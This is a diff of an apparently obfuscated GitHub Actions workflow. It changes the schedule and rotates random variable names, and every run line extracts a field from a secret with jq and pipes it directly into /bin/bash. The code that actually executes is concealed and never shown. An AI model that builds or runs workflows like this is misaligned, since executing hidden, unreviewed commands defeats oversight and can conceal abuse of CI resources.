@@ -2,25 +2,25 @@ name: nongjichang3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 5/6 * * *'
-jobs:  # 7330
+    - cron: '30 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nongjichang3456
         env:
-          sgxwp5053: ${{ secrets.sgxwp5053 }}
+          zxc4: ${{ secrets.zxc4 }}
         run: |
-          echo $sgxwp5053 | jq -r .czf033 | /bin/bash
-          echo $tgn87 | jq -r .yfub9 | /bin/bash
-          echo $tdfh65 | jq -r .h32583 | /bin/bash
-          echo $o04 | jq -r .ppxh06472 | /bin/bash
-          echo $fgv54552 | jq -r .lfd818 | /bin/bash
-          echo $njpf9 | jq -r .w3532 | /bin/bash
-          echo $a2 | jq -r .mtfpt8317 | /bin/bash
-          echo $taafv33 | jq -r .bnfr580 | /bin/bash
-          echo $pn5 | jq -r .z58 | /bin/bash
-          echo $f20 | jq -r .czimm83270 | /bin/bash
+          echo $zxc4 | jq -r .qbqwr6048 | /bin/bash
+          echo $jvxct356 | jq -r .nz6 | /bin/bash
+          echo $n3 | jq -r .npuj747 | /bin/bash
+          echo $f16177 | jq -r .vgtj7 | /bin/bash
+          echo $jblr938 | jq -r .s5293 | /bin/bash
+          echo $adhq18 | jq -r .laj7800 | /bin/bash
+          echo $sxbo62009 | jq -r .sqhw23 | /bin/bash
+          echo $moss47 | jq -r .qkpk5361 | /bin/bash
+          echo $j1624 | jq -r .iqo33037 | /bin/bash
+          echo $ud4842 | jq -r .csix39 | /bin/bash
+          echo $y6 | jq -r .a0591 | /bin/bash
 
